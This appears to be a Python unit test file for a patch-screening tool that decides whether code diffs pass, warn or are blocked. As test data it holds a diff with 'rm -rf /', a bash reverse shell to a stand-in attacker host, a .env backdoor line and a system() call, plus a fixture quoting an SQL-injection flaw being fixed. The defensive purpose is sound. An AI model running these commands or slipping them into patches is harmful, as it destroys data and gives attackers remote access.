#!/usr/bin/env python3
"""
TC-SCA-024 G2: patch_guard.py 单元测试
"""
import sys
import os
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../scripts"))
from patch_guard import check_patch, load_policy, parse_diff, DEFAULT_POLICY


def write_temp_diff(content: str) -> str:
    """写入临时 diff 文件，返回路径"""
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".diff", delete=False)
    f.write(content)
    f.close()
    return f.name


VALID_DIFF = """\
--- a/audit.c
+++ b/audit.c
@@ -36,10 +36,10 @@
     char sql[1024];
     char *value_esc = zbx_db_dyn_escape_string(clientip);
 
-    /* VULNERABLE: uses clientip instead of escaped value_esc */
+    /* FIXED (CVE-2024-22120): use escaped value_esc to prevent SQL injection */
     snprintf(sql, sizeof(sql),
              "INSERT INTO auditlog(clientip) VALUES('%s')",
-             clientip);  /* <-- taint sink: should be value_esc */
+             value_esc);  /* <-- fixed: use escaped value */
 
     zbx_db_execute("%s", sql);
     free(value_esc);
"""

DANGEROUS_DIFF = """\
--- a/audit.c
+++ b/audit.c
@@ -10,3 +10,5 @@
-    old_code();
+    system("rm -rf /");
+    eval("malicious_code");
+    exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1");
"""

SENSITIVE_PATH_DIFF = """\
--- a/.env
+++ b/.env
@@ -1,2 +1,3 @@
 DB_HOST=localhost
+BACKDOOR=1
"""

LARGE_DELETION_DIFF = "\n".join(
    [f"--- a/audit.c\n+++ b/audit.c\n@@ -1,60 +1,5 @@"] +
    [f"-    line_{i}();" for i in range(60)] +
    ["+    safe_code();"]
)


class TestPatchGuardPass(unittest.TestCase):
    """正常补丁应通过检查"""

    def test_valid_patch_passes(self):
        diff_file = write_temp_diff(VALID_DIFF)
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            self.assertIn(result["decision"], ["PASS", "WARN"],
                          f"有效补丁应为 PASS 或 WARN，实际: {result}")
        finally:
            os.unlink(diff_file)

    def test_pass_has_no_blocked_reasons(self):
        diff_file = write_temp_diff(VALID_DIFF)
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            blocked_reasons = [r for r in result["reasons"] if "危险模式" in r or "敏感路径" in r]
            self.assertEqual(blocked_reasons, [],
                             f"有效补丁不应有 BLOCKED 原因: {blocked_reasons}")
        finally:
            os.unlink(diff_file)


class TestPatchGuardBlocked(unittest.TestCase):
    """危险补丁应被拦截"""

    def test_dangerous_commands_blocked(self):
        diff_file = write_temp_diff(DANGEROUS_DIFF)
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            self.assertEqual(result["decision"], "BLOCKED",
                             f"危险命令补丁应被 BLOCKED，实际: {result['decision']}")
        finally:
            os.unlink(diff_file)

    def test_sensitive_path_blocked(self):
        diff_file = write_temp_diff(SENSITIVE_PATH_DIFF)
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            self.assertEqual(result["decision"], "BLOCKED",
                             f"敏感路径补丁应被 BLOCKED，实际: {result['decision']}")
        finally:
            os.unlink(diff_file)

    def test_system_call_blocked(self):
        diff_file = write_temp_diff(
            "--- a/audit.c\n+++ b/audit.c\n@@ -1,1 +1,2 @@\n-old\n+system(\"id\");\n"
        )
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            self.assertEqual(result["decision"], "BLOCKED",
                             f"system() 调用应被 BLOCKED，实际: {result['decision']}")
        finally:
            os.unlink(diff_file)


class TestPatchGuardWarn(unittest.TestCase):
    """超出行数限制应产生警告"""

    def test_large_deletion_warns(self):
        diff_file = write_temp_diff(LARGE_DELETION_DIFF)
        try:
            result = check_patch(diff_file, DEFAULT_POLICY)
            self.assertIn(result["decision"], ["WARN", "BLOCKED"],
                          f"大量删除应为 WARN 或 BLOCKED，实际: {result['decision']}")
        finally:
            os.unlink(diff_file)


class TestPatchGuardMissing(unittest.TestCase):
    """文件不存在应返回 BLOCKED"""

    def test_missing_diff_file_blocked(self):
        result = check_patch("/nonexistent/path/patch.diff", DEFAULT_POLICY)
        self.assertEqual(result["decision"], "BLOCKED",
                         f"不存在的文件应返回 BLOCKED，实际: {result['decision']}")


class TestParseDiff(unittest.TestCase):
    """测试 diff 解析器"""

    def test_parse_valid_diff(self):
        diff_file = write_temp_diff(VALID_DIFF)
        try:
            info = parse_diff(diff_file)
            self.assertIn("audit.c", info["target_files"][0])
            self.assertGreater(info["total_added"], 0)
            self.assertGreater(info["total_deleted"], 0)
        finally:
            os.unlink(diff_file)

    def test_parse_counts_lines(self):
        diff_file = write_temp_diff(VALID_DIFF)
        try:
            info = parse_diff(diff_file)
            self.assertEqual(info["total_added"], 2)
            self.assertEqual(info["total_deleted"], 2)
        finally:
            os.unlink(diff_file)


class TestLoadPolicy(unittest.TestCase):
    """测试策略加载"""

    def test_load_default_when_missing(self):
        policy = load_policy("/nonexistent/policy.yaml")
        self.assertIn("allowed_patch_targets", policy)
        self.assertIn("blocked_paths", policy)

    def test_load_real_policy(self):
        policy_path = os.path.join(
            os.path.dirname(__file__), "../../configs/patch_policy.yaml"
        )
        if os.path.exists(policy_path):
            policy = load_policy(policy_path)
            self.assertIn("allowed_patch_targets", policy)


if __name__ == "__main__":
    unittest.main(verbosity=2)
